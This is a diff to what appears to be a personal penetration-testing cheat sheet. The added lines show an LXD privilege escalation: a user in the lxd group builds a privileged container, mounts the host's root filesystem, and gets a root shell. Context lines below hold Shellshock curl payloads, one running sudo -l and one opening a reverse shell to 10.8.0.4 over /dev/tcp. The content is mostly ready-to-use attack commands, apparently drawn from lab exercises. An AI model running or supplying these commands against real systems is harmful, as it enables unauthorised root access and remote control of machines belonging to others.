@@ -69,6 +69,26 @@
         https://github.com/DominicBreuker/pspy
 
 
+# LXC LXD
+        container-user@nix02:~$ id
+        uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
+
+        container-user@nix02:~$ cd ContainerImages
+        container-user@nix02:~$ ls
+
+        ubuntu-template.tar.xz
+        container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
+        container-user@nix02:~$ lxc image list
+
+        container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=true
+        container-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+        lxc start privesc
+
+        container-user@nix02:~$ lxc exec privesc /bin/bash
+        root@nix02:~# ls -l /mnt/root
+
+
+
 curl -H "User-Agent: () { :;}; echo; /bin/sudo -l" http://10.8.0.10/cgi-bin/shell.sh
 
 curl -H "User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/10.8.0.4/1234 0>&1" http://10.8.0.10/cgi-bin/shell.sh
